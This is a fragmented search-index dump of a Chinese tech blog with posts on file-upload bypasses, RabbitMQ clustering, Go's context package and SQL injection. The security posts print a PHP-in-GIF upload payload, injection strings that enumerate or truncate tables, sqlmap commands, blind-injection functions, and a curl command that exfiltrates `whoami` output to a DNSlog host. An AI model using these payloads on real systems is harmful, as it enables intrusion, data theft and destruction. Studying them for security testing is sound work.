","date":"2021-05-23","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:4:1","tags":["安全测试"],"title":"安全测试之-文件上传","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"提交报文修改检测绕过 1.先选择正常的文件进行上传 2.然后对上传文件的包进行截获，修改，重新上传 这种方法可以绕过前端检测 ","date":"2021-05-23","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:5:0","tags":["安全测试"],"title":"安全测试之-文件上传","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"服务端检测绕过 服务端监测点 1.文件扩展名 2.MIME/TYPE类型，该参数是由浏览器自动生成的，根据上传时选择的文件的扩展名进行mime/type的选择 3.文件内容 ","date":"2021-05-23","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:6:0","tags":["安全测试"],"title":"安全测试之-文件上传","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"MIME类型检测绕过 MIME(Multipurpose Interent Mail Extensions)是描述消息内容类型的因特网标准 MIME消息能包含文本、图像、音频、视频以及其他应用程序专用的数据 浏览器会自动根据上传的文件扩展名，对应到相应的MIME类型上 常见的MIME TYPE白名单 扩展名 MIME TYPE jpg image/jpeg png image/png txt text/plain zip application/zip doc application/msword ","date":"2021-05-23","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:6:1","tags":["安全测试"],"title":"安全测试之-文件上传","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"文件内容检测绕过 1.简单文件头检测 文件头是位于文件开头的一段承担一定任务的数据，一般都在开头部分 文件头的其实部分中一般开头标记文件类型 如GIF的文件头为GIF89a或GIF87a 绕过：这种只对文件头部进行简单匹配的方法，可以通过在上传的文件前追加合法的文件头进行绕过 如：GIF89a\u003c?php phpinfo();?\u003e 2.完整文件结构检测 通过调用图像函数（如getimagesize/imagecreatefromgif/imagecreatefrompng），进行文件检测是否为图像，需要文件内容保持相对完整，所以无法通过上面追加头部起始字节的方法进行绕过 绕过 这种检测可以将图片文件与欲上传文件进行合并来绕过检测 先搞一个小的图片文件，然后使用copy命令把要上传的非法文件进行合并，然后上传，就可以绕过完整文件检测了 3.恶意文件内容检测 检测提交的文件中是否包含webshell等数据 ","date":"2021-05-23","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:6:2","tags":["安全测试"],"title":"安全测试之-文件上传","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"文件上传小技巧 1.文件参数多为filename属性 文件上传过程中，如果存在waf拦截一些扩展名，可以通过尝试多个filename属性 2.目录可控时，可以尝试使用目录穿越的方法（../） 目录可控：程序在指定路径下的指定后缀的文件禁止访问，这种情况下如果非法程序上传成功了，但是也无法执行的 此时需要抓包，将filename属性添加上../，意思是上传到指定目录的上一级，这样访问上一级就能绕过该方式的控制了 ","date":"2021-05-23","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:7:0","tags":["安全测试"],"title":"安全测试之-文件上传","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"解析漏洞 1.IIS/Nginx+PHP fastcgi取值错误解析漏洞（配置错误） 开启了cgi.fix_pathinfo，如果开启后，执行文件不存在，会继续查找上一级文件是否存在， ","date":"2021-05-23","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:8:0","tags":["安全测试"],"title":"安全测试之-文件上传","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"绕过技巧 ","date":"2021-05-23","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:9:0","tags":["安全测试"],"title":"安全测试之-文件上传","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"重绘图 应用调用图片库对上传的文件进行了图像转换，所以即使将图片与文件合并，也会将尾部转换掉，无法使用前面的方法进行文件上传 解决方法： 1.将正常图片用目标使用的图形库进行转换 2.寻找转换前后两次未变的部分 3.将未变部分替换为欲上传的webshell 4.将替换后的文件进行图像转换，看是否转换后仍存在替换后部分 ","date":"2021-05-23","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:9:1","tags":["安全测试"],"title":"安全测试之-文件上传","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"记录一次工作中搭建rabbitmq集群遇到的问题 ","date":"2021-05-18","objectID":"/posts/rabbitmq%E9%95%9C%E5%83%8F%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/:0:0","tags":["工作日记"],"title":"工作日记-rabbitmq镜像集群部署(短篇)","uri":"/posts/rabbitmq%E9%95%9C%E5%83%8F%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/"},{"categories":null,"content":"rabbitmq是啥 erlang语言编写的开源的用来做消息队列的系统 ","date":"2021-05-18","objectID":"/posts/rabbitmq%E9%95%9C%E5%83%8F%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/:1:0","tags":["工作日记"],"title":"工作日记-rabbitmq镜像集群部署(短篇)","uri":"/posts/rabbitmq%E9%95%9C%E5%83%8F%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/"},{"categories":null,"content":"集群部署流程（centos7） erlang部署略 rabbitmq单节点部署略 下载与自己服务器相应的包，我下载了一个Unix的包，然后日志提示读取磁盘信息错误，centos7下载el7的包即可 192.168.1.10 192.168.1.11 192.168.1.12 配置集群 10为主节点 1.在/etc/hosts文件中配置三台机器的主机名和IP映射，三台服务器都要配置 192.168.1.10 mqa 192.168.1.11 mqb 192.168.1.12 mqc 2.修改/var/lib/rabbitmq/.erlang.cookie文件中的内容，需要三台服务器一致 该文件其他人的权限必须是0 3.在mqb和mqc执行下面命令添加到mqa节点 systemctl start rabbitmq-server # 启动服务 rabbitmqctl stop_app # 停止rabbitmq应用 rabbitmqctl reset # 重置节点，该操作会删除该节点的集群信息，持久化信息，用户信息 rabbitmqctl join_cluster rabbit@mqa # 将该节点添加到mqa节点下，mqa节点必须是开启状态 rabbitmqctl start_app # 启动rabbitmq应用 rabbitmqctl-plugins enable rabbitmq_management # 开启web管理插件，如果想在浏览器查看集群状态时，每个节点都要启用该配置 4.在主节点开启web管理插件 rabbitmq-plugins enable rabbitmq_management 5.在浏览器访问主节点IP+15672端口就能看到集群相关信息了 写的很简单，过程很心酸😭 ","date":"2021-05-18","objectID":"/posts/rabbitmq%E9%95%9C%E5%83%8F%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/:2:0","tags":["工作日记"],"title":"工作日记-rabbitmq镜像集群部署(短篇)","uri":"/posts/rabbitmq%E9%95%9C%E5%83%8F%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/"},{"categories":null,"content":"对context的源码理解还没有很深，当前只处于学习阶段 ","date":"2021-05-11","objectID":"/posts/golang-context/:0:0","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"Context是啥 context是go中跨越API边界以及进程之间的取消信号和其他请求范围的值 –摘自contex.context.go 在Go1.7版本中引入了context，主要用于在goroutine之间传递上下文消息，包括取消信号，超时时间，截止时间，键值对 context是并发安全的 ","date":"2021-05-11","objectID":"/posts/golang-context/:1:0","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"为什么需要Context 在go中，每个请求需要开启一个goroutine去处理，但是在大部分业务流程中，一个goroutine并不能很好的满足需求，通常一个请求需要开启多个goroutine来处理该请求，比如一些预处理的工作 但是在业务中由于某些原因（比如操作被取消，请求超时等），业务流程可能会被中断，那么由该请求开启的一些goroutine就会变成孤儿协程，造成资源浪费 那么此时就需要来通知这些goroutine关闭 在go中channel+select可以用来给子goroutine发送信号，通知它们关闭，但是在某些场景下用该方式就会比较复杂，搞不好容易写出问题 于是context应运而生 ","date":"2021-05-11","objectID":"/posts/golang-context/:2:0","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"Context包 ","date":"2021-05-11","objectID":"/posts/golang-context/:3:0","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"context接口： Deadline()：返回context的截止时间，通过判断该时间，函数就能决定是否进行下面的操作 Done()：返回一个只读的channel，表示context被取消的信号，当这个channel被关闭时，说明context被取消了。 channel为空且不关闭时，读不出任何东西，当关闭时，则会读出存储类型的零值 Err()：返回channel被关闭的原因 Value()：获取设置的key所对应的val ","date":"2021-05-11","objectID":"/posts/golang-context/:3:1","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"Canceler接口： 该接口定义了cancel方法和Done方法，用来取消context 实现了这两个方法的struct是：*cancelCtx和*timeCtx ","date":"2021-05-11","objectID":"/posts/golang-context/:3:2","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"emptyCtx type emptyCtx int emptyCtx永远不会取消，没有值，也没有截止日期 它不是struct {}，因为此类型的var必须具有不同的地址 该类型体实现了context接口中定义的方法 下面定义了两个变量 var ( background = new(emptyCtx) todo = new(emptyCtx) ) 然后通过下面两个方法对外开放 // Background returns a non-nil, empty Context. It is never canceled, has no // values, and has no deadline. It is typically used by the main function, // initialization, and tests, and as the top-level Context for incoming // requests. func Background() Context { return background } // TODO returns a non-nil, empty Context. Code should use context.TODO when // it's unclear which Context to use or it is not yet available (because the // surrounding function has not yet been extended to accept a Context // parameter). func TODO() Context { return todo } Background主要用来初始化根节点，是context的默认值，并且还作为上下文的根节点存在 TODO方法返回一个非空的context，当不知道要传入那个context时，可以传入context.TODO ","date":"2021-05-11","objectID":"/posts/golang-context/:3:3","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"cancelCtx结构体 cancelCtx可以被取消，该结构体实现了canceler接口，它将Context作为它的一个匿名字段，这样该结构体就可以被看作成一个context Done()方法：该方法被调用时才会make一个存放struct的channel，然后把该channel返回 Err()方法：该方法返回一个context取消的原因 cancel()方法：通过关闭c.done，递归取消传递下去的所有子节点，从父节点删除自己，子goroutine接收关闭信号的方式就是select只读的c.done ","date":"2021-05-11","objectID":"/posts/golang-context/:3:4","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"WithCancel函数 该函数需要传入一个根节点，上面说的Background，然后会返回一个子context，和一个用于取消子context的cancel函数，一旦调用cancel函数，当前context的子节点就会select到关闭的c.done，从而关闭goroutine func WithCancel(parent Context) (ctx Context, cancel CancelFunc) { c := newCancelCtx(parent) propagateCancel(parent, \u0026c) return \u0026c, func() { c.cancel(true, Canceled) } } newCancelCtx将传入的上下文包装成私有结构体context.cancelCtx propagateCancel函数会构建上下文之间的关联，当父context被取消时，取消子context func propagateCancel(parent Context, child canceler) { done := parent.Done() if done == nil { return // 父上下文不会触发取消信号 } select { case \u003c-done: child.cancel(false, parent.Err()) // 父上下文已经被取消 return default: } if p, ok := parentCancelCtx(parent); ok { p.mu.Lock() if p.err != nil { child.cancel(false, p.err) } else { p.children[child] = struct{}{} } p.mu.Unlock() } else { go func() { select { case \u003c-parent.Done(): child.cancel(false, parent.Err()) case \u003c-child.Done(): } }() } } 对上面代码的解读 如果context.Done为空时，则不会出发取消事件，函数直接返回 当传入的根节点的context对象的Done被关闭时，child也就是子context会被直接取消 parentCancelCtx函数返回父级的基础*cancelCtx，如果是父级也是*context时， child会被加入根context的children列表中，等待根context发送取消信号 如果父级不是*context的话，则开启一个新的goroutine监听根节点的Done()，和child.Done()两个channel，如果根节点的Done()被关闭时，则调用child的cancel取消子上下文 所以该函数的作用是在根context和子context之间同步取消信号，保证根context被取消后，子context也能收到取消信号 context.concelCtx.cancel() 该方法会关闭context中的channel并同步取消信号 ","date":"2021-05-11","objectID":"/posts/golang-context/:3:5","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"timerCtx 该结构体基于cancelCtx，添加了time.Timer和deadline // A timerCtx carries a timer and a deadline. It embeds a cancelCtx to // implement Done and Err. It implements cancel by stopping its timer then // delegating to cancelCtx.cancel. type timerCtx struct { cancelCtx timer *time.Timer // Under cancelCtx.mu. deadline time.Time } 通过cancelCtx来实现Done和Err 计时器到期时则通知cancelCtx.cancel来关闭context *timerCtx.cancel func (c *timerCtx) cancel(removeFromParent bool, err error) { c.cancelCtx.cancel(false, err) if removeFromParent { // Remove this timerCtx from its parent cancelCtx's children. removeChild(c.cancelCtx.Context, c) } c.mu.Lock() if c.timer != nil { c.timer.Stop() c.timer = nil } c.mu.Unlock() } 第二行调用了contextCtx的cancel方法 第三行，如果removeFromParent为true，则调用removeChild方法从父节点中删除子节点 第八行，如果定时器不为空，则停止计时，防止时间到了之后再次发起取消信号 ","date":"2021-05-11","objectID":"/posts/golang-context/:3:6","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"WithTimeout函数 func WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc) { return WithDeadline(parent, time.Now().Add(timeout)) } 该函数返回的是WithDeadline函数，参数是一个根context对象和当前时间+超时时间 ","date":"2021-05-11","objectID":"/posts/golang-context/:3:7","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"WithDeadline函数 func WithDeadline(parent Context, d time.Time) (Context, CancelFunc) { if cur, ok := parent.Deadline(); ok \u0026\u0026 cur.Before(d) { // The current deadline is already sooner than the new one. return WithCancel(parent) } c := \u0026timerCtx{ cancelCtx: newCancelCtx(parent), deadline: d, } propagateCancel(parent, c) dur := time.Until(d) if dur \u003c= 0 { c.cancel(true, DeadlineExceeded) // deadline has already passed return c, func() { c.cancel(false, Canceled) } } c.mu.Lock() defer c.mu.Unlock() if c.err == nil { c.timer = time.AfterFunc(dur, func() { c.cancel(true, DeadlineExceeded) }) } return c, func() { c.cancel(true, Canceled) } } 官方注释写的是该函数返回父context的children，并将截止日期调整为不晚于传入的时间 第二行，如果父级的截止时间更早，则返回 c := \u0026timerCtx：新建timerCtx对象，deadline的值为传入的截止时间，context使用传入的跟节点 第十行，调用propagateCancel函数，当父节点被取消时取消子节点 dur := time.Until(d)：得到一个当前时间到d的时间差 如果截止时间已过，则调用cancel方法，并传入超过截止时间的错误 如果新建的context的err为空，则返回一个截止时间的计时器 ","date":"2021-05-11","objectID":"/posts/golang-context/:3:8","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"valueCtx type valueCtx struct { Context key, val interface{} } valueCtx继承了Context func (c *valueCtx) String() string { return contextName(c.Context) + \".WithValue(type \" + reflectlite.TypeOf(c.key).String() + \", val \" + stringify(c.val) + \")\" } func (c *valueCtx) Value(key interface{}) interface{} { if c.key == key { return c.val } return c.Context.Value(key) } valueCtx实现了String和Value方法 value方法返回key的val，如果当前节点不存在，则查找上一个节点，这里是一个递归操作 使用WithValue函数来创建valueCtx func WithValue(parent Context, key, val interface{}) Context { if key == nil { panic(\"nil key\") } if !reflectlite.TypeOf(key).Comparable() { panic(\"key is not comparable\") } return \u0026valueCtx{parent, key, val} } 官方的注释写的是返回父项的副本，key必须可以比较，不能为string类型(string可以比较吧，而且我试了string也可以啊😥)或者其它内置类型，避免使用上下文在程序包之间发生冲突 ","date":"2021-05-11","objectID":"/posts/golang-context/:3:9","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"使用Context context的根节点使用context.Background()函数来创建，上面也有写到，Background函数会返回一个emptyCtx，一个空的context，不能被取消，没有值也没有超时时间 创建子节点的方法 func WithCancel(parent Context) (ctx Context, cancel CancelFunc) { func WithValue(parent Context, key, val interface{}) Context { func WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc) { func WithDeadline(parent Context, d time.Time) (Context, CancelFunc) { 一个一个来写一下 ","date":"2021-05-11","objectID":"/posts/golang-context/:4:0","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"WithCancel WithCancel 传入一个context的根节点，返回一个context的副本，和一个cancel方法 context的副本用于传入到子goroutine中 cancel用于通知子goroutine关闭 package main import ( \"context\" \"fmt\" \"sync\" \"time\" ) var wg sync.WaitGroup func main() { Work() } func Work() { ctx, cancel := context.WithCancel(context.Background()) wg.Add(1) go Preloading(ctx) //开启一个子goroutine，并把返回的context的副本传入 time.Sleep(time.Second * 3) cancel() //调用cancel关闭context.done，子goroutine通过select ctx.Done来关闭进程 wg.Wait() } func Preloading(ctx context.Context) { fmt.Println(\"loading...\") // 等待发出关闭信号 for { fmt.Println(\"wait...\") time.Sleep(time.Second) select { case \u003c-ctx.Done(): //当cancel被调用时，context.done会被关闭，这里会select到ctx.Done的零值 fmt.Println(\"ctx.Done close\") wg.Done() return default: fmt.Println(\"ctx.Done not close\") } } } ","date":"2021-05-11","objectID":"/posts/golang-context/:4:1","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"WithValue 该函数将传入的键值对传入到根节点 传入一个根节点，和kv对，k必须是可以比较的，返回一个context的副本，用于传入子goroutine 一个简单的例子 package main import ( \"context\" \"fmt\" ) func main() { Work() } func Work() { ctx := context.WithValue(context.Background(), 1, \"a\") Preloading(ctx) } func Preloading(ctx context.Context) { id, ok := ctx.Value(1).(string) //如果找到了为1的key，则返回1的val和ok if ok { fmt.Printf(\"work id 1 is val: %s\", id) }else { fmt.Printf(\"not work id 1\\n\") } } ","date":"2021-05-11","objectID":"/posts/golang-context/:4:2","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"WithTimeout 传入一个context根节点和一个时段 返回一个context根节点的副本和一个cancel context根节点的副本用于传入子goroutine，cancel用于通知子goroutine关闭 一个简单的例子 package main import ( \"context\" \"fmt\" \"sync\" \"time\" ) var wg sync.WaitGroup func main() { Work() } func Work() { ctx, cancel := context.WithTimeout(context.Background(), time.Second*5) wg.Add(1) go Preloading(ctx) time.Sleep(time.Second * 6) cancel() //如果工作已经完毕了，但是时间还没到，可以调用cancel来关闭 wg.Wait() } func Preloading(ctx context.Context) { for { fmt.Println(\"wait...\") time.Sleep(time.Second) select { case \u003c-ctx.Done(): fmt.Println(\"ctx.Done close\") wg.Done() return default: fmt.Println(\"ctx.Done not close\") } } } ","date":"2021-05-11","objectID":"/posts/golang-context/:4:3","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"WithDeadline 跟WithTimeout很相似 传入一个context根节点和一个未来时间点，返回一个context根节点的副本和cancel context的副本用于传入子goroutine，cancel用于通知子goroutine关闭 一个简单的例子 package main import ( \"context\" \"fmt\" \"sync\" \"time\" ) var wg sync.WaitGroup func main() { Work() } func Work() { d := time.Now().Add(time.Second * 5) //定义一个未来时间点 ctx, cancel := context.WithDeadline(context.Background(), d) wg.Add(1) go Preloading(ctx) time.Sleep(time.Second * 6) defer cancel() //如果工作已经完毕了，但是时间还没到，可以调用cancel来关闭 wg.Wait() } func Preloading(ctx context.Context) { for { fmt.Println(\"wait...\") time.Sleep(time.Second) select { case \u003c-ctx.Done(): fmt.Println(\"ctx.Done close\") wg.Done() return default: fmt.Println(\"ctx.Done not close\") } } } ","date":"2021-05-11","objectID":"/posts/golang-context/:4:4","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"总结 像 WithCancel、WithDeadline、WithTimeout、WithValue 这些创建函数 实际上是创建了一个个的链表结点而已。我们知道，对链表的操作，通常都是 O(n) 复杂度的，效率不高。 那么，context 包到底解决了什么问题呢？ 答案是：cancelation。仅管它并不完美，但它确实很简洁地解决了问题。 –摘自：https://qcrao.com/2019/06/12/dive-into-go-context/ 在使用中对容易造成内存泄漏的地方，要特别注意cancel的调用 ","date":"2021-05-11","objectID":"/posts/golang-context/:5:0","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"学习资料 Go SDK 1.14.4 context https://qcrao.com/2019/06/12/dive-into-go-context/ https://draveness.me/golang/docs/part3-runtime/ch06-concurrency/golang-context/ https://www.liwenzhou.com/posts/Go/go_context/#autoid-0-1-4 ","date":"2021-05-11","objectID":"/posts/golang-context/:6:0","tags":["Golang"],"title":"Golang之Context","uri":"/posts/golang-context/"},{"categories":null,"content":"什么是SQL注入 当被测程序没有对没有对输入参数进行校验的情况下，请求方可以向参数中添加一些影响SQL的字符，导致程序直接用请求者传入的参数去数据库查询，会导致原有的SQL被修改，不能按预期执行 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:1:0","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"SQL注入示例 比如一个查询接口，查询指定时间段内的数据 SELECT * FROM STAPP WHERE TC_OD_OPT_DT \u003e '2020-11-16 15:05:01' AND TC_OD_OPT_DT \u003c '2020-11-18 15:05:01' LIMIT 0,30; 如果没有对输入参数做校验，前端传入了截断字符串的参数，那SQL就变成了下面这样 SELECT * FROM STAPP WHERE TC_OD_OPT_DT \u003e '2000-11-16 15:05:01' AND TC_OD_OPT_DT \u003c '2020-11-18 15:05:01';#') LIMIT 0,30; 上面的查询直接查询了很长一段时间范围内的数据，如果数据量非常大的话，会对数据库造成较大压力 或者 SELECT * FROM STAPP WHERE TC_OD_OPT_DT \u003e '2000-11-16 15:05:01' AND TC_OD_OPT_DT \u003c '2020-11-18 15:05:01'; select table_name from information_schema.tables;#') LIMIT 0,30; 上面的操作就获取到了所有表名称 如果业务登录的用户权限够大的话，然后就可以这样 SELECT * FROM STAPP WHERE TC_OD_OPT_DT \u003e '2000-11-16 15:05:01' AND TC_OD_OPT_DT \u003c '2020-11-18 15:05:01'; truncate table STAPP;#') LIMIT 0,30; 上面的操作会清空整张STAPP表 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:2:0","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"注入点 文本框注入 常见的用户名文本输入框，密码文本输入框，查询文本输入框 url注入 针对连接后面的参数进行测试，比如在网站上点击一篇文章，网站前端会把文章的ID放到url中发送GET请求到服务端 如：https://www.jianshu.com/p/178ca3ddc866，可以对最后面的文章id进行注入测试 工具 spider：可以获取到一个网址的所有链接 sqlmap：开源渗透测试工具，能自动检测利用SQL注入缺陷并接管数据库服务器 sqlmap使用方法： sqlmap -u \"url\"：检测注入点，url中必须有例如id=123类似的参数 sqlmap -l：从Burpsuite proxy或WebScarab proxy中读取http请求日志文件 sqlmap -x：从sitemap.xml站点地图文件中读取目标检测 sqlmap -m：从多行文本格式文件读取多个目标，对多个目标进行探测 sqlmap -r：从Burp suite保存的文本文件中读取http请求作为注入探测的目标 sqlmap -c：从配置文件sqlmap.conf中读取目标探测 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:3:0","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"注入方法 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:4:0","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"布尔盲注 可以进行注入，但是不能通过注入直接拿到数据库中的数据 func SelectUser(db *sql.DB, name string) bool { rows, err := db.Query(`SELECT u.\"name\" FROM \"user\" u WHERE u.\"name\" = $1`,name) ifErr(err) user := User{} for rows.Next() { err := rows.Scan(\u0026user.Name) ifErr(err) if user.Name == \"\"{ return false }else { return true } } } 如果上面代码中的db.Query方法没有对传入的name参数做校验的话，那么该程序是存在注入漏洞的 虽然没有返回查询数据与错误信息，但是返回了查询结果 如果正常查询操作，会返回正常的结果 SelectUser(db,\"test\")//查询到test则返回true，否则返回false 如果传入一个非法参数，如下所示 SelectUser(db,\"test'\") 上面传入的name参数为test的值存在，当在后面输入一个截断的单引号时，该sql会执行失败，会返回false 这样就成功的测试出了该参数是存在注入漏洞的 通过这个漏洞可以对请求参数后添加一些其他的语句，对请求的内容做出判断，如果返回true那么我们的判断则是正确的，否则是错误的 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:4:1","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"时间盲注 当存在注入漏洞的查询接口，无论有没有查询到数据，都返回相同的值时，可以构造sql语句，通过相应时间来判断盲注的成功与否 示例： 编写逻辑sql，通过条件语句进行判断，为真则立即执行，否则延时执行。语法为： if(left(user(),1)='a',0,sleep(3)); 如果left(user(),1)='a'判断为真，则返回0，如果判断为假，则执行sleep(3) ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:4:2","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"mysql中盲注的一些方法 left()函数： select left(database(),1) = 's' database显示数据库名称，left函数从左截取数据库名称的前N位 regexp select user() regexp '^r' 正则表达式的用法，与left()用法相似，也是从左往右匹配，当匹配成功时则返回1 substr函数：用来截取字符串 SELECT SUBSTR((SELECT DATABASE()),1，1) //截取查询结果的第一位 ascii函数：可以将字符串转换为ascii码值，该方法可以避免单引号的出现，能适用于更多的场景 select ascii(SUBSTR((SELECT database()),1,1)) 通过以上方法可以进行盲注测试 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:4:3","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"DnsLog盲注 当程序存在注入漏洞，但是既不会返回查询结果，又不会返回错误信息时，可以通过布尔盲注和时间盲注通过猜测注入的方式获取到数据，但是这个过程效率很低，要发起很多请求。 所以需要一种方式，减少请求，直接返回查询结果，这里可以使用DnsLog实现注入 DnsLog盲注原理 DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息 DNS的日志信息 curl xx.r4ourp.ceye.io 记录信息 详情 地址 方式 user-agent HTTP Request http://xx.r5ourp.ceye.io/ 10.10.10.10 GET curl/7.3.0 DNS Query xx.r5ourp.ceye.io 10.10.10.10 curl `whoami`.r4ourp.ceye.io 记录信息 详情 地址 方式 user-agent HTTP Request http://test.r5ourp.ceye.io/ 10.10.10.10 GET curl/7.3.0 DNS Query test.r5ourp.ceye.io 10.10.10.10 